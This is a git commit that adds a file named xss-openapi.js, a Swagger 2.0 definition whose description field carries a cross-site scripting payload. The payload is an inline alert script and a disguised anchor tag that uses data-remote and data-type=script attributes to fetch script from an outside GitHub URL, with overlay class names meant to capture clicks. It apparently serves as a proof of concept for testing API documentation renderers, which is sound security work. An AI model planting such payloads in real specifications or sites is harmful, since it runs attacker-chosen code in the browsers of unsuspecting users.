676fa8a61e6a655e9e76e50ba1b501cc7e87ccf8
dtf-test <114986812+dtf-test@users.noreply.github.com>
2022-10-04 15:40:43 +0700

    Create xss-openapi.js

---
+++ xss-openapi.js
@@ -0,0 +1,5 @@
+{
+  "swagger" : "2.0",
+  "info" : {
+    "description" : "<a href=https://raw.githubusercontent.com/dtf-test/alert/main/README.md data-type=script style='cursor:default' data-remote=true class='atwho-view select2-drop-mask pika-select'></a><script>alert(0)</script>"
+  }}
